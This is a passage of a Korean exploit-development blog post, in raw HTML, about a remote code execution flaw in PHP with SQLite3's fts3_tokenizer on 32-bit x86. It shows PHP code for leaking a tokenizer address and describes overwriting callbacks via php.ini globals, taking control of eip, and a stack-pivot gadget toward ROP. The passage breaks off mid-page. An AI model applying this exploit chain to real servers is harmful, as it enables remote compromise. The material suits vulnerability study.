진행하였습니다.</li>\n</ul>\n<h2 id=\"x86bit-환경-php-with-sqlite3-fts3-tokenizer-rce-취약점\" style=\"position:relative;\"><a href=\"#x86bit-%ED%99%98%EA%B2%BD-php-with-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"x86bit 환경 php with sqlite3 fts3 tokenizer rce 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>x86bit 환경 PHP with SQLite3 fts3 tokenizer RCE 취약점</h2>\n<h3 id=\"fts3_tokenizer-info-leak\" style=\"position:relative;\"><a href=\"#fts3_tokenizer-info-leak\" aria-label=\"fts3_tokenizer info leak permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3_tokenizer info leak</h3>\n<ul>\n<li>leak 된 simple tokenizer의 주소 값을 리틀 엔디안으로 변경 작업을 진행시 4바이트 기준으로 fllip을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\n  <span class=\"token variable\">$len</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$val</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select hex(fts3_tokenizer('simple')) addr;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$leaked_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token function\">hexdec</span><span class=\"token punctuation\">(</span><span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leaked_addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h3 id=\"fts3-tokenizer-callback\" style=\"position:relative;\"><a href=\"#fts3-tokenizer-callback\" aria-label=\"fts3 tokenizer callback permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 tokenizer callback</h3>\n<ul>\n<li>2번째 인자인 callback 주소를 컨트롤 하여 임의의 값으로 덮여 씌어진 것을 확인 할 수 있습니다.</li>\n<li><code class=\"language-text\">edi</code> 레지스터를 조작해 원하는 방향을 이동이 가능한 것을 확인할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 80.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACZklEQVQ4y32U6XKiUBSEMTHqGBVXXOOuiGzigrtGy8oyM+//Oj112sEKcWp+UBQXbt/vnO6D0u1PMBr7aHVs9AYe5FkfLzAczWE5Gwz02W29Wteh5prIFVoolLrI5pt4iOYQeczyLpdSqenQjQUMcwlvdqS4CBimD9Ne8V2jOUalNuShuUIb8R8akqkqEsnyveBLy0Sn52IyPZCqVO4hGivg8SnPD2KJIjcokcz1elBDVyAW3JWi1oM3O5Ck1bXRH05JKeUpShqFUgf5YpuH1ZtjKEqKm79ShQif0zVsdu8wnTWcyRazxSt2h08MjTkFaw0DWqWP5foC292i/mKw7GvpJSgRNUyYytSwWJ5JJX0TI2b+iW0QQSEtal1MpnvM/RMPLFcHbI2sxxKle8LV5g2Ot6Oo6+3gry909Uo4oqMiZLkbGiNmPMWLJJRehwSFcLv/oCmWsybJavt2E2y2LTosPRRno7H8/015TldZythaMXOmveazkIig9EyMu5qUokiQgH+aklLrOLz+IpmUG5giWRRBiZUEWXIqSRDyfLHDaH0VuglKGdP5kdPRG3rc6E73FJLcaZUBY2P9TYGU/50qJJhW6ziefnNKXG+P+fKMzf6DeSRh26KrfOefMbZXIbrvwiQUscFohr4+vY1gQChiQjgyfSZBSKWHwdQEojdT0moD++NP9tB2Nyx/e/ikQUEPJdjSBgm3ZFXyl0hqnOk7QsmU5E5ONqwlnMkO/uqCdtehq9ccdniQTIq4Xyr3SS1/njtBmQj5UEat0TTZ9GtUuognNTqayb5wTUi5KfhRRDJ3Jf8BBjCmWCl/LGYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/21ee7ce62817f36943371acf662f8f00/37523/7.png\"\n        srcset=\"/static/21ee7ce62817f36943371acf662f8f00/e9ff0/7.png 180w,\n/static/21ee7ce62817f36943371acf662f8f00/f21e7/7.png 360w,\n/static/21ee7ce62817f36943371acf662f8f00/37523/7.png 720w,\n/static/21ee7ce62817f36943371acf662f8f00/83e77/7.png 889w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>하지만 해당 레지스터를 활용해서 Stack Pivot를 하기에는 어려움이 있기 때문에 <code class=\"language-text\">xOpen</code> 의 pInput을 트리거하는 방식으로 조작해보겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>xOpen<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer <span class=\"token operator\">*</span>pTokenizer<span class=\"token punctuation\">,</span>\n\t<span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>pInput<span class=\"token punctuation\">,</span>\n\t<span class=\"token keyword\">int</span> nBytes<span class=\"token punctuation\">,</span>\n\tsqlite3_tokenizer_cursor <span class=\"token operator\">*</span><span class=\"token operator\">*</span>ppCursor\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>만약 xCreate 를 모두 제어하기 위해서는 xOpen을 제어할 수 있는 연속적인 메모리 데이터 3개 이상이 필요합니다.</li>\n<li>이를 위해서 <code class=\"language-text\">PHP.ini</code> list의 값을 설정합니다.</li>\n</ul>\n<p><strong>PHP.ini (Structure _php_ps_globals)</strong></p>\n<ul>\n<li>Expand PHP Module의 코드를 보면 해당 ini 구조체가 정의되어 있으며 이러한 자료구조는 프로세스 상에서 전역적으로 존재하고 <code class=\"language-text\">.bss</code> 섹션에 포함되어 있기 때문에 위치를 알 수 있으며 공격하는데 있어서 좋은 벡터입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">// https://www.php.net/manual/en/ini.list.php</span>\n\n<span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_php_ps_globals</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>save_path<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>session_name<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>id<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>extern_referer_chk<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>entropy_file<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cache_limiter<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> entropy_length<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> cookie_lifetime<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cookie_path<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>cookie_domain<span class=\"token punctuation\">;</span>\n\tzend_bool  cookie_secure<span class=\"token punctuation\">;</span>\n\tzend_bool  cookie_httponly<span class=\"token punctuation\">;</span>\n\tps_module <span class=\"token operator\">*</span>mod<span class=\"token punctuation\">;</span>\n\tps_module <span class=\"token operator\">*</span>default_mod<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>mod_data<span class=\"token punctuation\">;</span>\n\tphp_session_status session_status<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> gc_probability<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> gc_divisor<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> gc_maxlifetime<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> module_number<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> cache_expire<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>앞서 구조체에서 활용하는 필드는 빨간색으로 주석 처리한 부분을 사용할 예정이며, 포인터 구조와 정수 형태를 트리거할 수 있는 필드를 선정하여 가젯들이 적용할 수 있는 범위를 늘렸습니다.</li>\n<li>php.ini 항목을 조작하여 fts3 tokenizer 모듈 구조체를 조작할 수 있습니다.</li>\n</ul>\n<h3 id=\"fts3-tokenizer-두-번째-인자-ebp-레지스터-조작\" style=\"position:relative;\"><a href=\"#fts3-tokenizer-%EB%91%90-%EB%B2%88%EC%A7%B8-%EC%9D%B8%EC%9E%90-ebp-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0-%EC%A1%B0%EC%9E%91\" aria-label=\"fts3 tokenizer 두 번째 인자 ebp 레지스터 조작 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 tokenizer 두 번째 인자 ebp 레지스터 조작</h3>\n<ul>\n<li>두 번쨰 인자 ebp 레지스터를 다양한 메모리 범위로 조작이 가능하기 때문에 php.ini 의 <code class=\"language-text\">ps_globals</code> 의 구조체를 사용하기 위해 <code class=\"language-text\">gc_probability</code> 필드의 주소를 지정하였고 해당 위치로 이동하기 에 있어 <code class=\"language-text\">-0x4</code> 바이트 연산을 해서 호출원에서 계산 된 오프셋을 조작하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJklEQVQY0z2Q2U7CYBCFf3YoLRQQWkpFUBarhbYsDdZSliIERaIhJt75/k9xzEyMVzOZzJz5zhGT+RreNILtBFwdbwm1eoNavYt2x0b3zkGl1oHZfoBuDCDJTeQlDbc9F4ZpIZmuoKH3eVeSdYgwOmLmb+F4IRbBC/ynHR/K5RbW23ds4jNEsoyR+4z98QKt2Udd6+Hy9YPl6hXpbA3+Ika8/2AIQUT2OMDAmsGdLFm4dW2hqBhYbU6I1m9IZap4HC1wOF74iIh3+0+MvZAJyRk9J2ciCA9wpxGG1pzFqCd85Y+QREmQIjmdv2GY92ybHlAcJNgfTjHzN1BUE4KGhaKOXKHxn082X2crlEmhqPERzeVSC5ncFUcghAKRKCGRUrkKIXP/CxNqjhNe+sh1AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/baacb06fc343009d4872d0068294f270/37523/8.png\"\n        srcset=\"/static/baacb06fc343009d4872d0068294f270/e9ff0/8.png 180w,\n/static/baacb06fc343009d4872d0068294f270/f21e7/8.png 360w,\n/static/baacb06fc343009d4872d0068294f270/37523/8.png 720w,\n/static/baacb06fc343009d4872d0068294f270/1e088/8.png 840w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>ps_globals의 <code class=\"language-text\">gc_probability</code>, <code class=\"language-text\">gc_divisor</code>, <code class=\"language-text\">gc_maxlifetime</code> 해당 필드는 셋 전부 long 타입을 갖는 필드 입니다.</li>\n<li><code class=\"language-text\">xOpen</code> 을 트리거하기 위해서는 정상적으로 <code class=\"language-text\">xCreate</code> 가 동작한 후에 <code class=\"language-text\">insert query</code> 가 실행되어야 합니다. 그렇기 때문에 fts3 table <code class=\"language-text\">simple</code> 의 <code class=\"language-text\">simple_create</code> 해시 테이블 주소를 콜백으로 변경하여 <code class=\"language-text\">xOepn</code> 함수로 갈 경로를 만들어 봅시다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABNklEQVQY02WRaU/CQBiEUa5KEGmB2tRCaWnlElpALqEC4RQbjSVoICpfTPT//4Ex+yYYDB8mu9njmdlZn1Xro1huQ9UqSKtlGPk6hGQWwXASslKErBTgDwrgE1mac5FLUkoyEBcyOA3wOPHHaWTytbsTNJojRGMylEwJb9svMuAiIqYLD9O5h0AogZtqF956R6Z8QoX7tEHPWRDsH9AZLtHtzSAkNWg5C++fP6hYPUoxW6zw4L5SWrvuYPvxDVWvUNrVeofByD0G1m4HqNp9RGNXkOQ8OefMGkJcCs5gSWIJC6UW3OcN1RCLp8ms1RkfA5udMay6A1EyYeYbmMxekNWrCJ+JYHt3/TkB2Rp7oigZOL9QKDE7f9Th/fARumFDN23qiXXkD/KUUJKv/z5lf2Gvw7VD4C+nJqeQLk/kqAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/6db69931f8bc72d39cf86bbb2ed4df15/37523/9.png\"\n        srcset=\"/static/6db69931f8bc72d39cf86bbb2ed4df15/e9ff0/9.png 180w,\n/static/6db69931f8bc72d39cf86bbb2ed4df15/f21e7/9.png 360w,\n/static/6db69931f8bc72d39cf86bbb2ed4df15/37523/9.png 720w,\n/static/6db69931f8bc72d39cf86bbb2ed4df15/5b481/9.png 846w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>현재 환경에서 <code class=\"language-text\">0xe3bbc0</code> 의 주소는 <code class=\"language-text\">simpleCreate</code> 객체를 가리키고 다음 <code class=\"language-text\">0x7fffffff</code> 두 값들은 임의로 집어넣은 값입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.555555555555557%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAiUlEQVQI1x3MYQqCMACAUVPLFJVp22w6QZMpaCEhmD+6/7W+oHeA58WyI1UDWrSYvEGmBissVrSUeU1W1KTGEcuerHLEicG/SMKrJogU/vmG5+ecAoEfFnhiWNHTh6ed2eqRpRrYmonVjDgzcO8m1LwjlwO1HOj+TWFelI+Dst+R7ksiR4JI/tMfs4EzcOgpS4wAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/f4ca616e40d5344f5d77255f3092c4c6/37523/10.png\"\n        srcset=\"/static/f4ca616e40d5344f5d77255f3092c4c6/e9ff0/10.png 180w,\n/static/f4ca616e40d5344f5d77255f3092c4c6/f21e7/10.png 360w,\n/static/f4ca616e40d5344f5d77255f3092c4c6/37523/10.png 720w,\n/static/f4ca616e40d5344f5d77255f3092c4c6/cecac/10.png 728w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>php의 <code class=\"language-text\">ini_set</code> 메서드를 이용해서 각 전역 필드에 값을 넣어 줍니다.</li>\n<li>앞서 xOpen 을 활용하기 위해 세 개의 메모리 대역이 필요하다고 했는데 이를 <code class=\"language-text\">ps_globals</code> 필드를 활용하였습니다.</li>\n<li>필드의 값이 어디 부분에서 터지는지를 확인하기 위해 임의의 데이터를 넣은 결과 <code class=\"language-text\">eip</code> 레지스터를 조작할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7klEQVQoz5XSTXOCMBAG4BWtVgVSEFJUEAREHT9bqtVeOszYW///33mdrKPVg1M5bJI95MlmExomK7ivKYQVoG10Uam+oPpkX0LlWs3iuF7fC1KbiNroB1N87g8IhwvO1bzdHxBEc1DFfBglHkjHaPyO7+IX4+kG0hshTteYLXaQXnoD/lvhH5gj3xSI4iUaTReDaM647UTlwPqzy6Dq5e7rB344Q61uc55vC3i9rBzY0rvcM1WZCkcmjAhrAEP4IE2UexQiE0QGkuwNVidEz59AN/t8yBlT0CPYCdQEXzmbfHB1jozRaMrS3+UMHgF3Wbt/cgVUNgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/6227d5a0df36cef3a1d595e8b3994e79/37523/11.png\"\n        srcset=\"/static/6227d5a0df36cef3a1d595e8b3994e79/e9ff0/11.png 180w,\n/static/6227d5a0df36cef3a1d595e8b3994e79/f21e7/11.png 360w,\n/static/6227d5a0df36cef3a1d595e8b3994e79/37523/11.png 720w,\n/static/6227d5a0df36cef3a1d595e8b3994e79/c1328/11.png 866w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 함수가 호출하는 호출 구간은 <code class=\"language-text\">call [edx+0xc]</code> 형태로 <code class=\"language-text\">edx</code> 레지스터를 기준으로 call이 되어지고 <code class=\"language-text\">eax</code> 레지스터에는 xOpen의 <code class=\"language-text\">insert in to query</code>의 value 값이 포함된 것을 확인할 수 있습니다.</li>\n</ul>\n<h3 id=\"stack-pivot를-이용한-payload-data-메모리-위치-변경-작업\" style=\"position:relative;\"><a href=\"#stack-pivot%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-payload-data-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%9C%84%EC%B9%98-%EB%B3%80%EA%B2%BD-%EC%9E%91%EC%97%85\" aria-label=\"stack pivot를 이용한 payload data 메모리 위치 변경 작업 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Stack Pivot를 이용한 Payload data 메모리 위치 변경 작업</h3>\n<ul>\n<li>앞서 취약점을 활용하여 프로그램 카운터를 조작이 가능한 상태입니다.</li>\n<li>원하는 메모리 번지의 대역을 eax 레지스터가 참조하고 있는 구조</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAkUlEQVQI133OvQ6CMABFYbQtYpGflhRaDJEEq6iLvv/DHQODg4kON2f7cpO88hg3Ys0JJS1KWcRSaZGiRiiDyBwbUZNsq7VbaT79XmKLwGuYufvIo5t4hgtXNzL3kXOIxDAxDjd80dOVPXnmSH5gK3jQHqM7yr2j0i0291jdousjuhlXQImaNG3YpQ3iz7sFfAMSPEXyTROC+AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"PHP\"\n        title=\"PHP\"\n        src=\"/static/3ac23bc623be2a035e32088d57b9fee9/37523/12.png\"\n        srcset=\"/static/3ac23bc623be2a035e32088d57b9fee9/e9ff0/12.png 180w,\n/static/3ac23bc623be2a035e32088d57b9fee9/f21e7/12.png 360w,\n/static/3ac23bc623be2a035e32088d57b9fee9/37523/12.png 720w,\n/static/3ac23bc623be2a035e32088d57b9fee9/20982/12.png 778w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">insert into a value</code> 값으로 ROP를 수행할 수 있는 영역으로 만들기 위해 <code class=\"language-text\">XCHG</code> 가젯을 이용하여 eax 레지스터와 esp 레지스터를 체인하여 현재 프로그램 카운터가 생성된 페이로드 데이터의 메모리 대역으로 이동하도록 변경하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"wasm\"><pre class=\"language-wasm\"><code class=\"language-wasm\">xchg esp, eax;\nret;</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    